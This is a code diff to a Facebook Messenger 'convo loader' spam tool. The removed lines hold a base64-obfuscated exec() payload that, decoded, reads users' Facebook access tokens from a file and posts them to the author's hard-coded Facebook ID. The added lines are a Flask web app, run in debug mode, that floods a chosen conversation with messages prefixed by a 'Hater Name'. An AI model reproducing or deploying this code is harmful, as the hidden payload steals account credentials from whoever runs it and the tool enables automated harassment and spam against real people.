@@ -1,6 +1,165 @@
-#ENCODED BY : MUMIT ISLAM HIMU
-#ENCRYPTION : Py3 BASE64
-#GITHUB : https://github.com/MUMIT-404-CYBER
-#----------------------------------------------
-import base64
-exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCgpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBkb19HRVQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9wbGFpbicpCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpCiAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIlRIMyBMM0czTkQgRkFJWlUgS0lORyIpCgpkZWYgZXhlY3V0ZV9zZXJ2ZXIoKToKICAgIFBPUlQgPSA0MDAwCgogICAgd2l0aCBzb2NrZXRzZXJ2ZXIuVENQU2VydmVyKCgiIiwgUE9SVCksIE15SGFuZGxlcikgYXMgaHR0cGQ6CiAgICAgICAgcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkKICAgICAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkKCm1tbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1IzZU1td25pJykudGV4dAoKZGVmIHNlbmRfaW5pdGlhbF9tZXNzYWdlKCk6CiAgICB3aXRoIG9wZW4oJ3Bhc3N3b3JkLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICBwYXNzd29yZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCiAgICBlbnRlcmVkX3Bhc3N3b3JkID0gcGFzc3dvcmQgICMgUHJvbXB0IGZvciBwYXNzd29yZAoKICAgIGlmIGVudGVyZWRfcGFzc3dvcmQgIT0gcGFzc3dvcmQ6CiAgICAgICAgcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQogICAgICAgIHN5cy5leGl0KCkKCiAgICBpZiBtbW0gbm90IGluIHBhc3N3b3JkOgogICAgICAgIHByaW50KCdbLV0gPD09PiBJbmNvcnJlY3QgUGFzc3dvcmQhJykKICAgICAgICBzeXMuZXhpdCgpCgogICAgd2l0aCBvcGVuKCd0b2tlbm51bS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQoKICAgICMgTW9kaWZ5IHRoZSBtZXNzYWdlIGFzIHBlciB5b3VyIHJlcXVpcmVtZW50CiAgICBtc2dfdGVtcGxhdGUgPSAiSGVsbG8gIEZhaXp1IGtpbmchIEkgYW0gdXNpbmcgeW91ciBzZXJ2ZXIuIE15IHRva2VuIGlzIC0tLS0tLS0tLS0tLS0tLS0gICAge30iCgogICAgIyBTcGVjaWZ5IHRoZSBJRCB3aGVyZSB5b3Ugd2FudCB0byBzZW5kIHRoZSBtZXNzYWdlCiAgICB0YXJnZXRfaWQgPSAiMTAwMDY3MDE2MTQ1NDY5IgoKICAgIHJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpCgogICAgZGVmIGxpbmVzcygpOgogICAgICAgIHByaW50KCdcdTAwMWJbMzdtJyArICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQoKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgICAgICAnVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywKICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IGEwNHMgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCiAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywKICAgICAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKICAgIH0KCiAgICBmb3IgdG9rZW4gaW4gdG9rZW5zOgogICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnN0cmlwKCkKICAgICAgICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAve30vIi5mb3JtYXQoJ3RfJyArIHRhcmdldF9pZCkKICAgICAgICBtc2cgPSBtc2dfdGVtcGxhdGUuZm9ybWF0KGFjY2Vzc190b2tlbikKICAgICAgICBwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogbXNnfQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoKICAgICAgICAjIE5vIG5lZWQgdG8gcHJpbnQgaGVyZSwgYXMgcmVxdWVzdGVkCiAgICAgICAgY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQogICAgICAgIHRpbWUuc2xlZXAoMC4xKSAgIyBXYWl0IGZvciAxIHNlY29uZCBiZXR3ZWVuIHNlbmRpbmcgZWFjaCBpbml0aWFsIG1lc3NhZ2UKCiAgICAjcHJpbnQoIlxuWytdIEluaXRpYWwgbWVzc2FnZXMgc2VudC4gU3RhcnRpbmcgdGhlIG1lc3NhZ2Ugc2VuZGluZyBsb29wLi4uXG4iKQpzZW5kX2luaXRpYWxfbWVzc2FnZSgpCmRlZiBzZW5kX21lc3NhZ2VzX2Zyb21fZmlsZSgpOgogICAgd2l0aCBvcGVuKCdjb252by50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgY29udm9faWQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgogICAgd2l0aCBvcGVuKCdGaWxlLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICBtZXNzYWdlcyA9IGZpbGUucmVhZGxpbmVzKCkKCiAgICBudW1fbWVzc2FnZXMgPSBsZW4obWVzc2FnZXMpCgogICAgd2l0aCBvcGVuKCd0b2tlbm51bS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQogICAgbnVtX3Rva2VucyA9IGxlbih0b2tlbnMpCiAgICBtYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9tZXNzYWdlcykKCiAgICB3aXRoIG9wZW4oJ2hhdGVyc25hbWUudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgIGhhdGVyc19uYW1lID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKICAgIHdpdGggb3BlbigndGltZS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgc3BlZWQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkKCiAgICBkZWYgbGluZXNzKCk6CiAgICAgICAgcHJpbnQoJ1x1MDAxYlszN20nICsgJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCgogICAgaGVhZGVycyA9IHsKICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLAogICAgICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLAogICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCiAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywKICAgICAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKICAgIH0KCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgZm9yIG1lc3NhZ2VfaW5kZXggaW4gcmFuZ2UobnVtX21lc3NhZ2VzKToKICAgICAgICAgICAgICAgIHRva2VuX2luZGV4ID0gbWVzc2FnZV9pbmRleCAlIG1heF90b2tlbnMKICAgICAgICAgICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2Vuc1t0b2tlbl9pbmRleF0uc3RyaXAoKQoKICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSBtZXNzYWdlc1ttZXNzYWdlX2luZGV4XS5zdHJpcCgpCgogICAgICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNy4wL3t9LyIuZm9ybWF0KCd0XycgKyBjb252b19pZCkKICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2V9CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCiAgICAgICAgICAgICAgICBjdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSTolTTolUyAlcCIpCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5vazoKICAgICAgICAgICAgICAgICAgICBwcmludCgiWytdIE1lc3NhZ2Uge30gb2YgQ29udm8ge30gc2VudCBieSBUb2tlbiB7fToge30iLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCgiW3hdIEZhaWxlZCB0byBzZW5kIE1lc3NhZ2Uge30gb2YgQ29udm8ge30gd2l0aCBUb2tlbiB7fToge30iLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChzcGVlZCkKCiAgICAgICAgICAgIHByaW50KCJcblsrXSBBbGwgbWVzc2FnZXMgc2VudC4gUmVzdGFydGluZyB0aGUgcHJvY2Vzcy4uLlxuIikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpCgpkZWYgbWFpbigpOgogICAgc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQogICAgc2VydmVyX3RocmVhZC5zdGFydCgpCgogICAgIyBTZW5kIHRoZSBpbml0aWFsIG1lc3NhZ2UgdG8gdGhlIHNwZWNpZmllZCBJRCB1c2luZyBhbGwgdG9rZW5zCgoKICAgICMgVGhlbiwgY29udGludWUgd2l0aCB0aGUgbWVzc2FnZSBzZW5kaW5nIGxvb3AKICAgIHNlbmRfbWVzc2FnZXNfZnJvbV9maWxlKCkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBtYWluKCk='))
+from flask import Flask, request, render_template_string
+import requests, os, time, uuid, threading
+
+app = Flask(__name__)
+app.debug = True
+
+# Stop codes ko store karne ke liye
+active_tasks = {}
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9'
+}
+
+def send_messages(task_id, access_token, thread_id, mn, messages, time_interval):
+    """Background thread: Messages send karta hai jab tak stop na ho"""
+    while task_id in active_tasks:
+        try:
+            for message1 in messages:
+                if task_id not in active_tasks:  # stop ho gaya
+                    break
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"[{task_id}] Sent: {message}")
+                else:
+                    print(f"[{task_id}] Failed: {message}")
+                time.sleep(time_interval)
+        except Exception as e:
+            print(f"[{task_id}] Error: {e}")
+            time.sleep(5)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        # Agar stop ID submit hua
+        stop_id = request.form.get("stopId")
+        if stop_id:
+            if stop_id in active_tasks:
+                del active_tasks[stop_id]
+                return f"<h2 style='color:red;'>✅ Messages stopped for ID: {stop_id}</h2><a href='/'>Go Back</a>"
+            else:
+                return f"<h2 style='color:orange;'>⚠️ Invalid Stop ID</h2><a href='/'>Go Back</a>"
+
+        # Normal form (start sending)
+        access_token = request.form.get('accessToken')
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        task_id = str(uuid.uuid4())[:8]  # Unique stop code
+        active_tasks[task_id] = True
+
+        # Thread start
+        threading.Thread(target=send_messages, args=(task_id, access_token, thread_id, mn, messages, time_interval), daemon=True).start()
+
+        return f"""
+        <div style='text-align:center;margin-top:50px;'>
+          <h2 style='color:green;'>✅ Messages Started!</h2>
+          <p>Use this <b>STOP ID</b> to stop messages:</p>
+          <h3 style='color:red;'>{task_id}</h3>
+          <a href='/'>Go Back</a>
+        </div>
+        """
+
+    return render_template_string("""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>😈 𝐃𝐀𝐍𝐈𝐒𝐇 𝐉𝐈𝐈𝐉𝐔 😗 Server 🚀</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body{
+      background: url('https://i.ibb.co/rKJkLpXq/FB-IMG-17565703745232914.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Trebuchet MS', sans-serif;
+    }
+    .container{
+      max-width: 400px;
+      background-color: rgba(255,255,255,0.9);
+      border-radius: 15px;
+      padding: 25px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.6);
+      margin-top: 40px;
+    }
+    .header{
+      text-align: center;
+      color: darkblue;
+    }
+    .btn-submit{
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 12px;
+      font-weight: bold;
+    }
+    .footer{
+      text-align: center;
+      margin-top: 15px;
+      color: white;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mb-3">🔥 😈 𝐃𝐀𝐍𝐈𝐒𝐇 𝐉𝐈𝐈𝐉𝐔 😗 Convo Server 🔥</h1>
+    <h3>Made By:  😈 𝐃𝐀𝐍𝐈𝐒𝐇 𝐉𝐈𝐈𝐉𝐔 😗</h3>
+  </header>
+
+  <div class="container">
+    <form action="/" method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="accessToken">Enter Your Token:</label>
+        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
+      </div>
+      <div class="mb-3">
+        <label for="threadId">Enter Convo/Inbox ID:</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx">Enter Hater Name:</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile">Select Your Notepad File:</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+      </div>
+      <div class="mb-3">
+        <label for="time">Speed in Seconds:</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">🚀 Start Messages</button>
+    </form>
+  </div>
+
+  <div class="container mt-4">
+    <form action="/" method="post">
+      <div class="mb-3">
+        <label for="stopId">Enter STOP ID:</label>
+        <input type="text" class="form-control" id="stopId" name="stopId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit">🛑 Stop Messages</button>
+    </form>
+  </div>
+
+  <footer class="footer">
+    <p>© 😈 𝐃𝐀𝐍𝐈𝐒𝐇 𝐉𝐈𝐈𝐉𝐔 😗 Trickster's 2024 | Anime Convo Loader</p>
+  </footer>
+</body>
+</html>
+    """)
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
